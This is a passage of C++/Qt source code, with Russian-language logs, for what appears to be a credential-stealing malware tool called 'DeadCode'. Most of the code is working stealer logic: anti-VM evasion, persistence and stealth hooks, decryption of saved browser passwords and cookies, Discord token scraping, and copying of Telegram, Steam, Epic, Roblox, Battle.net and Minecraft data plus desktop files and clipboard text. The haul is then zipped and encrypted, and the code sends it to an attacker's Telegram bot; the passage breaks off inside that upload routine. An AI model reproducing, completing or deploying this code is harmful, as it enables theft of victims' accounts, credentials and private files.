            workflowRunId = response["id"].toString();
            if (workflowRunId.isEmpty()) {
                emitLog("Ошибка: Не удалось получить ID workflow\n");
                isBuilding = false;
            } else {
                statusCheckTimer->start(30000);
            }
        } else {
            emitLog("Ошибка запуска GitHub Actions: " + reply->errorString() + "\n");
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

void MainWindow::checkBuildStatus()
{
    if (workflowRunId.isEmpty()) {
        emitLog("Ошибка: ID workflow не установлен\n");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны\n");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply *reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonObject json = QJsonDocument::fromJson(reply->readAll()).object();
            QString status = json["status"].toString();
            QString conclusion = json["conclusion"].toString();
            emitLog("Статус сборки GitHub Actions: " + status + " (Conclusion: " + conclusion + ")\n");
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка успешно завершена через GitHub Actions\n");
                    emit startStealSignal();
                } else {
                    emitLog("Сборка завершилась с ошибкой\n");
                    isBuilding = false;
                }
            }
        } else {
            emitLog("Ошибка проверки статуса GitHub Actions: " + reply->errorString() + "\n");
            statusCheckTimer->stop();
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

void MainWindow::startStealProcess()
{
    if (config.antiVM && isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина. Завершение работы.\n");
        FakeError();
        exitApp();
        return;
    }
    if (config.fakeError) FakeError();
    if (config.silent) Stealth();
    if (config.autoStart || config.persist) Persist();

    // Запуск кражи данных в отдельном потоке
    std::string tempDir = std::string(std::getenv("TEMP")) + "\\DeadCode_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(tempDir));
    emitLog("Создана временная директория: " + QString::fromStdString(tempDir) + "\n");

    QThread* thread = new QThread;
    StealerWorker* worker = new StealerWorker(this, tempDir);
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
}

void MainWindow::StealAndSendData(const std::string& tempDir)
{
    // Генерация мусорного кода (имитация)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 5000);
    volatile int dummy = dis(gen);
    for (int i = 0; i < dummy; ++i) {
        dummy ^= (dummy << 1) ^ (dummy >> 1);
    }
    emitLog("Выполнен мусорный код перед началом кражи данных\n");

    // Выполнение полиморфного кода
    emitLog("Выполнен полиморфный код перед началом кражи данных\n");

    if (config.screenshot) takeScreenshot(tempDir);
    if (config.systemInfo) collectSystemInfo(tempDir);
    if (config.cookies || config.passwords) stealBrowserData(tempDir);
    if (config.discord || config.chatHistory) stealDiscordData(tempDir);
    if (config.telegram || config.chatHistory) stealTelegramData(tempDir);
    if (config.steam || config.steamMAFile) stealSteamData(tempDir);
    if (config.epic) stealEpicData(tempDir);
    if (config.roblox) stealRobloxData(tempDir);
    if (config.battlenet) stealBattleNetData(tempDir);
    if (config.minecraft) stealMinecraftData(tempDir);
    if (config.fileGrabber) stealFiles(tempDir);
    if (config.socialEngineering) collectSocialEngineeringData(tempDir);

    std::string archivePath = tempDir + "\\stolen_data.zip";
    archiveData(tempDir, archivePath);

    std::string encryptedPath = tempDir + "\\stolen_data_encrypted.zip";
    encryptData(archivePath, encryptedPath);

    sendData(encryptedPath);

    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()) + "\n");
    }
}

void MainWindow::takeScreenshot(const std::string& dir)
{
    QScreen *screen = QGuiApplication::primaryScreen();
    if (screen) {
        QPixmap screenshot = screen->grabWindow(0);
        std::string path = dir + "\\screenshot.png";
        if (screenshot.save(QString::fromStdString(path), "PNG")) {
            emitLog("Скриншот сохранен: " + QString::fromStdString(path) + "\n");
        } else {
            emitLog("Ошибка: Не удалось сохранить скриншот\n");
        }
    } else {
        emitLog("Ошибка: Не удалось сделать скриншот\n");
    }
}

void MainWindow::collectSystemInfo(const std::string& dir)
{
    QString systemInfo = "System Information:\n";
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        systemInfo += "Computer Name: " + QString::fromWCharArray(computerName) + "\n";
    }

    wchar_t userName[UNLEN + 1];
    size = sizeof(userName) / sizeof(userName[0]);
    if (GetUserNameW(userName, &size)) {
        systemInfo += "Username: " + QString::fromWCharArray(userName) + "\n";
    }

    systemInfo += "OS: " + QSysInfo::prettyProductName() + "\n";
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    if (!hostInfo.addresses().isEmpty()) {
        systemInfo += "IP: " + hostInfo.addresses().first().toString() + "\n";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    systemInfo += "Processor Architecture: " + QString::number(si.wProcessorArchitecture) + "\n";
    systemInfo += "Number of Processors: " + QString::number(si.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        systemInfo += "Total Physical Memory: " + QString::number(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB\n";
    }

    std::string path = dir + "\\system_info.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << systemInfo;
        file.close();
        emitLog("Системная информация сохранена: " + QString::fromStdString(path) + "\n");
    } else {
        emitLog("Ошибка: Не удалось сохранить системную информацию\n");
    }
}

void MainWindow::stealBrowserData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"Chrome", std::string(appDataPath) + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", std::string(appDataPath) + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", std::string(appDataPath) + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", std::string(appDataPath) + "\\Opera Software\\Opera GX Stable\\"},
        {"Vivaldi", std::string(appDataPath) + "\\Vivaldi\\User Data\\Default\\"},
        {"Yandex", std::string(appDataPath) + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browsers) {
        if (config.passwords) {
            std::string loginDataPath = browser.second + "Login Data";
            if (std::filesystem::exists(loginDataPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_LoginData_temp";
                try {
                    std::filesystem::copy_file(loginDataPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных паролей %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_passwords.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* password = sqlite3_column_blob(stmt, 2);
                                int passwordLen = sqlite3_column_bytes(stmt, 2);

                                out << "URL: " << (url ? QString::fromUtf8(url) : "N/A") << "\n";
                                out << "Username: " << (username ? QString::fromUtf8(username) : "N/A") << "\n";
                                if (password && passwordLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)passwordLen, (BYTE*)password};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Password: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Password: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать пароль для %1\n").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Password: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Пароли %1 сохранены: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для паролей %1\n").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для паролей %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных паролей %1 не найдена\n").arg(QString::fromStdString(browser.first)));
            }
        }
        if (config.cookies) {
            std::string cookiesPath = browser.second + "Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_Cookies_temp";
                try {
                    std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных куки %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_cookies.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* value = sqlite3_column_blob(stmt, 2);
                                int valueLen = sqlite3_column_bytes(stmt, 2);

                                out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                if (value && valueLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)valueLen, (BYTE*)value};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Value: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Value: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать куки для %1\n").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Value: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Куки %1 сохранены: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для куки %1\n").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для куки %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных куки %1: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных куки %1 не найдена\n").arg(QString::fromStdString(browser.first)));
            }
        }
    }

    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string firefoxPath = std::string(appDataPath) + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
            std::string profilePath = entry.path().string();
            if (config.passwords) {
                std::string loginsPath = profilePath + "\\logins.json";
                if (std::filesystem::exists(loginsPath)) {
                    std::string path = dir + "\\firefox_logins.json";
                    if (QFile::copy(QString::fromStdString(loginsPath), QString::fromStdString(path))) {
                        emitLog("Пароли Firefox сохранены: " + QString::fromStdString(path) + "\n");
                    } else {
                        emitLog("Ошибка копирования паролей Firefox\n");
                    }
                }
            }
            if (config.cookies) {
                std::string cookiesPath = profilePath + "\\cookies.sqlite";
                if (std::filesystem::exists(cookiesPath)) {
                    std::string tempPath = dir + "\\firefox_cookies_temp.sqlite";
                    try {
                        std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                    } catch (const std::exception& e) {
                        emitLog(QString("Ошибка копирования базы данных куки Firefox: %1\n").arg(QString::fromStdString(e.what())));
                        continue;
                    }

                    sqlite3 *db;
                    if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                        sqlite3_stmt *stmt;
                        if (sqlite3_prepare_v2(db, "SELECT host, name, value FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                            std::string path = dir + "\\firefox_cookies.txt";
                            QFile file(QString::fromStdString(path));
                            if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                                QTextStream out(&file);
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    const char* value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

                                    out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                    out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                    out << "Value: " << (value ? QString::fromUtf8(value) : "N/A") << "\n\n";
                                }
                                file.close();
                                emitLog("Куки Firefox сохранены: " + QString::fromStdString(path) + "\n");
                            } else {
                                emitLog("Ошибка: Не удалось создать файл для куки Firefox\n");
                            }
                            sqlite3_finalize(stmt);
                        } else {
                            emitLog(QString("Ошибка подготовки SQL-запроса для куки Firefox: %1\n").arg(QString::fromStdString(sqlite3_errmsg(db))));
                        }
                        sqlite3_close(db);
                        std::filesystem::remove(tempPath);
                    } else {
                        emitLog(QString("Ошибка открытия базы данных куки Firefox: %1\n").arg(QString::fromStdString(sqlite3_errmsg(db))));
                    }
                }
            }
        }
    }
}

void MainWindow::stealDiscordData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
    if (std::filesystem::exists(discordPath)) {
        std::string tokensPath = dir + "\\discord_tokens.txt";
        QFile file(QString::fromStdString(tokensPath));
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream ldbFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    QRegularExpression tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                    QRegularExpressionMatchIterator i = tokenRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }

                    QRegularExpression mfaTokenRegex("mfa\\.[\\w-]{84}");
                    i = mfaTokenRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }
                }
            }
            file.close();
            emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath) + "\n");
        } else {
            emitLog("Ошибка: Не удалось создать файл для токенов Discord\n");
        }
    } else {
        emitLog("Директория Discord не найдена\n");
    }
}

void MainWindow::stealTelegramData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string telegramPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";
    if (std::filesystem::exists(telegramPath)) {
        std::string destPath = dir + "\\telegram_data";
        try {
            std::filesystem::create_directory(destPath);
            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                if (entry.path().filename().string().find("D877F783D5D3EF8C") != std::string::npos) {
                    std::filesystem::copy(entry.path(), destPath + "\\" + entry.path().filename().string(), std::filesystem::copy_options::recursive);
                }
            }
            emitLog("Данные Telegram скопированы: " + QString::fromStdString(destPath) + "\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Telegram: " + QString::fromStdString(e.what()) + "\n");
        }
    } else {
        emitLog("Директория Telegram не найдена\n");
    }
}

void MainWindow::stealSteamData(const std::string& dir)
{
    std::string steamPath = "C:\\Program Files (x86)\\Steam\\";
    if (std::filesystem::exists(steamPath)) {
        std::string destPath = dir + "\\steam_data";
        try {
            std::filesystem::create_directory(destPath);
            if (config.steam) {
                for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
                    if (entry.path().filename().string().find("config") != std::string::npos) {
                        std::filesystem::copy(entry.path(), destPath + "\\config", std::filesystem::copy_options::recursive);
                    }
                }
                emitLog("Конфигурационные файлы Steam скопированы: " + QString::fromStdString(destPath + "\\config") + "\n");
            }
            if (config.steamMAFile) {
                for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
                    if (entry.path().filename().string().find("maFiles") != std::string::npos) {
                        std::filesystem::copy(entry.path(), destPath + "\\maFiles", std::filesystem::copy_options::recursive);
                    }
                }
                emitLog("MA-файлы Steam скопированы: " + QString::fromStdString(destPath + "\\maFiles") + "\n");
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Steam: " + QString::fromStdString(e.what()) + "\n");
        }
    } else {
        emitLog("Директория Steam не найдена\n");
    }
}

void MainWindow::stealEpicData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string epicPath = std::string(appDataPath) + "\\EpicGamesLauncher\\Saved\\";
    if (std::filesystem::exists(epicPath)) {
        std::string destPath = dir + "\\epic_data";
        try {
            std::filesystem::create_directory(destPath);
            std::filesystem::copy(epicPath, destPath, std::filesystem::copy_options::recursive);
            emitLog("Данные Epic Games скопированы: " + QString::fromStdString(destPath) + "\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Epic Games: " + QString::fromStdString(e.what()) + "\n");
        }
    } else {
        emitLog("Директория Epic Games не найдена\n");
    }
}

void MainWindow::stealRobloxData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string robloxPath = std::string(appDataPath) + "\\Roblox\\";
    if (std::filesystem::exists(robloxPath)) {
        std::string destPath = dir + "\\roblox_data";
        try {
            std::filesystem::create_directory(destPath);
            for (const auto& entry : std::filesystem::directory_iterator(robloxPath)) {
                if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos) {
                    std::filesystem::copy(entry.path(), destPath + "\\" + entry.path().filename().string(), std::filesystem::copy_options::recursive);
                }
            }
            emitLog("Данные Roblox скопированы: " + QString::fromStdString(destPath) + "\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Roblox: " + QString::fromStdString(e.what()) + "\n");
        }
    } else {
        emitLog("Директория Roblox не найдена\n");
    }
}

void MainWindow::stealBattleNetData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string battleNetPath = std::string(appDataPath) + "\\Battle.net\\";
    if (std::filesystem::exists(battleNetPath)) {
        std::string destPath = dir + "\\battlenet_data";
        try {
            std::filesystem::create_directory(destPath);
            std::filesystem::copy(battleNetPath, destPath, std::filesystem::copy_options::recursive);
            emitLog("Данные Battle.net скопированы: " + QString::fromStdString(destPath) + "\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Battle.net: " + QString::fromStdString(e.what()) + "\n");
        }
    } else {
        emitLog("Директория Battle.net не найдена\n");
    }
}

void MainWindow::stealMinecraftData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string minecraftPath = std::string(appDataPath) + "\\.minecraft\\";
    if (std::filesystem::exists(minecraftPath)) {
        std::string destPath = dir + "\\minecraft_data";
        try {
            std::filesystem::create_directory(destPath);
            for (const auto& entry : std::filesystem::directory_iterator(minecraftPath)) {
                if (entry.path().filename() == "launcher_profiles.json" || entry.path().filename() == "options.txt") {
                    std::filesystem::copy(entry.path(), destPath + "\\" + entry.path().filename().string());
                }
            }
            emitLog("Данные Minecraft скопированы: " + QString::fromStdString(destPath) + "\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Minecraft: " + QString::fromStdString(e.what()) + "\n");
        }
    } else {
        emitLog("Директория Minecraft не найдена\n");
    }
}

void MainWindow::stealFiles(const std::string& dir)
{
    char desktopPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    std::string destPath = dir + "\\desktop_files";
    try {
        std::filesystem::create_directory(destPath);
        for (const auto& entry : std::filesystem::directory_iterator(desktopPath)) {
            if (entry.is_regular_file()) {
                auto fileSize = std::filesystem::file_size(entry.path());
                if (fileSize < 5 * 1024 * 1024) { // Ограничение 5 МБ
                    std::filesystem::copy_file(entry.path(), destPath + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                }
            }
        }
        emitLog("Файлы с рабочего стола скопированы: " + QString::fromStdString(destPath) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования файлов с рабочего стола: " + QString::fromStdString(e.what()) + "\n");
    }
}

void MainWindow::collectSocialEngineeringData(const std::string& dir)
{
    std::string path = dir + "\\social_engineering.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << "Social Engineering Data:\n";

        QClipboard *clipboard = QGuiApplication::clipboard();
        QString clipboardText = clipboard->text();
        if (!clipboardText.isEmpty()) {
            out << "Clipboard: " << clipboardText << "\n";
        }

        char appDataPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
        std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
        if (std::filesystem::exists(discordPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream ldbFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    QRegularExpression emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                    QRegularExpressionMatchIterator i = emailRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << "Email (from Discord): " << match.captured() << "\n";
                    }
                }
            }
        }

        file.close();
        emitLog("Данные для социальной инженерии сохранены: " + QString::fromStdString(path) + "\n");
    } else {
        emitLog("Ошибка: Не удалось создать файл для данных социальной инженерии\n");
    }
}

void MainWindow::archiveData(const std::string& dir, const std::string& archivePath)
{
    zip_t *zip = zip_open(archivePath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать архив stolen_data.zip\n");
        return;
    }

    for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string relativePath = std::filesystem::relative(entry.path(), dir).string();
            std::replace(relativePath.begin(), relativePath.end(), '\\', '/');

            std::ifstream file(entry.path(), std::ios::binary);
            std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

            zip_source_t *source = zip_source_buffer(zip, buffer.data(), buffer.size(), 0);
            if (!source) {
                emitLog("Ошибка: Не удалось создать источник для файла " + QString::fromStdString(relativePath) + "\n");
                continue;
            }

            if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
                zip_source_free(source);
                emitLog("Ошибка: Не удалось добавить файл " + QString::fromStdString(relativePath) + " в архив\n");
            }
        }
    }

    zip_close(zip);
    emitLog("Данные архивированы: " + QString::fromStdString(archivePath) + "\n");
}

void MainWindow::encryptData(const std::string& inputPath, const std::string& outputPath)
{
    QFile inputFile(QString::fromStdString(inputPath));
    if (!inputFile.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для шифрования: " + QString::fromStdString(inputPath) + "\n");
        return;
    }

    QByteArray data = inputFile.readAll();
    inputFile.close();

    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);
    auto iv = generateIV();

    QByteArray xorData = applyXOR(data, key1);
    QByteArray aesData = applyAES(xorData, key2, iv);
    if (aesData.isEmpty()) {
        emitLog("Ошибка: Не удалось зашифровать данные\n");
        return;
    }

    QFile outputFile(QString::fromStdString(outputPath));
    if (outputFile.open(QIODevice::WriteOnly)) {
        outputFile.write((const char*)iv.data(), iv.size());
        outputFile.write(aesData);
        outputFile.close();
        emitLog("Данные зашифрованы: " + QString::fromStdString(outputPath) + "\n");
    } else {
        emitLog("Ошибка: Не удалось сохранить зашифрованные данные\n");
    }
}

void MainWindow::decryptData(const std::string& inputPath, const std::string& outputPath)
{
    QFile inputFile(QString::fromStdString(inputPath));
    if (!inputFile.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для дешифрования: " + QString::fromStdString(inputPath) + "\n");
        return;
    }

    QByteArray fullData = inputFile.readAll();
    inputFile.close();

    if (fullData.size() < 16) {
        emitLog("Ошибка: Файл слишком мал для дешифрования\n");
        return;
    }

    std::array<unsigned char, 16> iv;
    std::memcpy(iv.data(), fullData.constData(), 16);
    QByteArray encryptedData = fullData.mid(16);

    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);

    QByteArray aesData = applyAESDecrypt(encryptedData, key2, iv);
    if (aesData.isEmpty()) {
        emitLog("Ошибка: Не удалось дешифровать данные (AES)\n");
        return;
    }

    QByteArray decryptedData = applyXOR(aesData, key1);

    QFile outputFile(QString::fromStdString(outputPath));
    if (outputFile.open(QIODevice::WriteOnly)) {
        outputFile.write(decryptedData);
        outputFile.close();
        emitLog("Данные дешифрованы: " + QString::fromStdString(outputPath) + "\n");
    } else {
        emitLog("Ошибка: Не удалось сохранить дешифрованные данные\n");
    }
}

void MainWindow::sendData(const std::string& filePath)
{
    if (config.sendMethod == "Local File") {
        std::string destPath = QDir::currentPath().toStdString() + "\\stolen_data_encrypted.zip";
        try {
            std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Данные сохранены локально: " + QString::fromStdString(destPath) + "\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка сохранения данных локально: " + QString::fromStdString(e.what()) + "\n");
        }
    } else if (config.sendMethod == "Telegram") {
        sendToTelegram(filePath);
    } else if (config.sendMethod == "Discord") {
        sendToDiscord(filePath);
    }
}

void MainWindow::sendToTelegram(const std::string& filePath)
{
    if (config.telegramToken.empty() || config.chatId.empty()) {
        emitLog("Ошибка: Токен Telegram или Chat ID не указаны\n");
        return;
    }

    CURL *curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать libcurl\n");
        return;
    }

    curl_mime *form = curl_mime_init(curl);
    curl_mimepart *field = curl_mime_addpart(form);
    curl_mime_name(field, "chat_id");
    curl_mime_data(field, config.chatId.c_str(), CURL_ZERO_TERMINATED);

    field = curl_mime_addpart(form);
    curl_mime_name(field, "document");
    curl_mime_filedata(field, filePath.c_str());

    std::string url = "https://api.telegram.org/bot" + config.telegramToken + "/sendDocument";
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки в Telegram: " + QString::fromStdString(curl_easy_strerror(res)) + "\n");
    } else {
        QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
